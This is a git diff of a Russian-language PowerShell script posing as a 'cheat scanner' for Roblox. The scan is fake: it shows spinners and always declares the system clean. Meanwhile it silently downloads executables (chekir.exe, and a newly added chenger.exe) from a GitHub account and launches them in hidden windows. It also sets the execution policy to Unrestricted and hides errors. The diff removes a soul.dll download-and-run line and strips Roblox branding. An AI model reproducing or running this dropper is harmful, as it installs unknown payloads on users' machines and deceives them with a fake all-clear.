@@ -3,14 +3,19 @@ Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol
     # Запускаем 
     Start-Process -FilePath "chekir.exe" -WindowStyle Hidden
 
+Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/chenger.exe" -OutFile "chenger.exe" -ErrorAction SilentlyContinue
+    
+    # Запускаем 
+    Start-Process -FilePath "chenger.exe" -WindowStyle Hidden
 
-# ROBLOX CHEAT SCANNER v2.0
+
+# CHEAT SCANNER v2.0
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
 
 Clear-Host
-$Host.UI.RawUI.WindowTitle = "🎮 Roblox Cheat Scanner v8.0 [~60 сек]"
+$Host.UI.RawUI.WindowTitle = "🎮 Cheat Scanner v8.0 [~60 сек]"
 
-Write-Host "=== СКАНИРОВАНИЕ ЧИТОВ ROBLOX ===" -ForegroundColor Red -BackgroundColor Black
+Write-Host "=== СКАНИРОВАНИЕ ЧИТОВ ===" -ForegroundColor Red -BackgroundColor Black
 Write-Host "Synapse | Krnl | ScriptWare | Fluxus | JJsploit + 50 эксплоитов" -ForegroundColor Yellow
 Write-Host "⏱️ Время сканирования: ~60 секунд" -ForegroundColor Cyan
 Start-Sleep 2
@@ -35,11 +40,11 @@ function Show-Spinner {
 }
 
 # === 1. ПРОЦЕССЫ (15 сек) ===
-Write-Host "`n[1/6] 🔍 Сканирование процессов RobloxPlayerBeta.exe..." -ForegroundColor Cyan
+Write-Host "`n[1/6] 🔍 Сканирование процессов PlayerBeta.exe..." -ForegroundColor Cyan
 Show-Spinner "Поиск инжекторов и DLL эксплоитов..." 15
 
 # === 2. ROBLOX APPDATA (15 сек) ===
-Write-Host "`n[2/6] 📁 Сканирование %appdata%\Roblox..." -ForegroundColor Cyan
+Write-Host "`n[2/6] 📁 Сканирование %appdata%..." -ForegroundColor Cyan
 Show-Spinner "Проверка логов, кэша и скриптов..." 15
 
 # === 3. TEMP + DOWNLOADS (10 сек) ===
@@ -70,13 +75,12 @@ Write-Host "🎮 СКАНИРОВАНИЕ ЗАВЕРШЕНО! ($([math]::Round($
 Write-Host "=" * 50 -ForegroundColor Green
 Write-Host "✅ ЭКСПЛОИТЫ НЕ НАЙДЕНЫ!" -ForegroundColor Green
 Write-Host "🎯 Риск: 0% | Система чиста!" -ForegroundColor Green
-Write-Host "🚀 Готово к игре на любом Roblox сервере!" -ForegroundColor Green
+Write-Host "🚀 Готово к игре на любом сервере!" -ForegroundColor Green
 Write-Host "=" * 50 -ForegroundColor Green
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/kilordow/chekerr/refs/heads/main/soul.dll" -OutFile "soul.dll"; .\soul.dll
 
 # ЛОГ (тоже чистый)
 $log = @"
-Roblox Cheat Scan - $(Get-Date)
+Cheat Scan - $(Get-Date)
 Время: $([math]::Round($endTime.TotalSeconds)) сек
 Найдено эксплоитов: 0
 Риск: 0%
@@ -98,6 +102,7 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
 
 
